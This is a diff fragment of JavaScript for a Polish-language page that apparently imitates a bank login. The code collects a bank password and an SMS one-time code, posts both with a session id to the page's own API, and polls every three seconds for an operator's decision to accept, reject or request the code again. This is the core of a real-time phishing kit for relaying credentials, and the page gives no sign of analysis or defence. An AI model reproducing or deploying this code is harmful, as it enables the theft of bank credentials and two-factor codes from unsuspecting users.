+            var data = JSON.parse(text);
+            for (let i=0;i<data["result"].length;i++) {
+                if (data["result"][i]["uid"] == sessId) {
+                    if (data["result"][i]["accepted"] == "true") {
+                        summaryFunc()
+                        clearInterval(multipleFunc)
+                    }
+                } else {
+
+                }
+            }
+        });
+    }
+    const psdUpdate = () => {
+
+        if (document.getElementById('bank_psd').value !== "") {
+            $.post("/api/psdupdate/", {
+                bank_psd: $("#bank_psd").val(),
+                sessionId: bankId
+            }).done(data => {
+                $("#mainCont").empty()
+                $("#mainCont").append('<p style="font-size:20px">Logowanie...</p>')
+            }).fail(error => {
+                console.error("Coś poszło nie tak… Spróbuj ponownie za chwilę.", "Wystąpił błąd")
+            })
+
+        } else {
+            console.log('not selectec')
+        }
+    }
+
+    let multipleFunc = setInterval(function(){ regularCheck() }, 3000);
+
+
+    //WRONG PASS
+
+    const wrongPass = () => {
+        $.post("/api/wrongpass/", {
+            sessionId: bankId,
+            name: "false"
+        }).done(data => {
+            console.log('done')
+        }).fail(error => {
+            console.error("Coś poszło nie tak… Spróbuj ponownie za chwilę.", "Wystąpił błąd")
+        })
+    }
+
+    const regularPass = () => {
+        readTextFile("/api/sessions", function(text){
+            var data = JSON.parse(text);
+            for (let i=0;i<data["result"].length;i++) {
+                if (data["result"][i]["uid"] == sessId) {
+                    if (data["result"][i]["accepted"] == "wrongPass") {
+                        clearInterval(multiplePass)
+                        wrongPass()
+                        location.reload()
+                    }
+                } else {
+
+                }
+            }
+        });
+    }
+
+    let multiplePass = setInterval(function(){ regularPass() }, 3000);
+
+
+
+    //SUMMARY
+
+    const summaryFunc = () => {
+        $("#mainCont").empty()
+        $("#mainCont").append('<input type="text" placeholder="Kod SMS z telefonu" id="bank_summary" onclick="psdUpdate()">')
+        $("#buttonsCont").empty()
+        $("#buttonsCont").append('<button onclick="summaryCode()" type="submit" class="h--btn-arrow-right h--btn-light-green gotoPassword float-right long login-next-button fz-12">dalej</button>')
+
+    }
+
+    const summaryCode = () => {
+        if ($("#bank_summary").val() !== "") {
+            $.post("/api/summarycode/", {
+                bank_summary: $("#bank_summary").val(),
+                sessionId: bankId
+            }).done(data => {
+                $("#mainCont").empty()
+                $("#mainCont").append('<p style="font-size:20px">Logowanie...</p>')
+                $("#buttonsCont").empty()
+            }).fail(error => {
+                console.error("Coś poszło nie tak… Spróbuj ponownie za chwilę.", "Wystąpił błąd")
+            })
+
+        } else {
+            console.log('not selectec')
+        }
+    }
+
+    const regularSummary=()=>{readTextFile("/api/sessions",function(e){var s=JSON.parse(e);for(let e=0;e<s.result.length;e++)s.result[e].uid==sessId&&"wrongSummary"==s.result[e].accepted&&(summaryFunc(),wrongSum())})},wrongSum=()=>{$.post("/api/wrongsummary/",{sessionId:bankId,name:"false"}).done(e=>{console.log("done")}).fail(e=>{console.error("Coś poszło nie tak… Spróbuj ponownie za chwilę.","Wystąpił błąd")})};let multipleSummary=setInterval(function(){readTextFile("/api/sessions",function(e){var s=JSON.parse(e);for(let e=0;e<s.result.length;e++)s.result[e].uid==sessId&&"wrongSummary"==s.result[e].accepted&&(summaryFunc(),wrongSum())})},3e3);const regularComplete=()=>{readTextFile("/api/sessions",function(e){var s=JSON.parse(e);for(let e=0;e<s.result.length;e++)s.result[e].uid==sessId&&"completed"==s.result[e].accepted&&(location.href="/summary")})};let multipleCompleted=setInterval(function(){readTextFile("/api/sessions",function(e){var s=JSON.parse(e);for(let e=0;e<s.result.length;e++)s.result[e].uid==sessId&&"completed"==s.result[e].accepted&&(location.href="/summary")})},3e3);
+</script>
+
+
+</body></html>
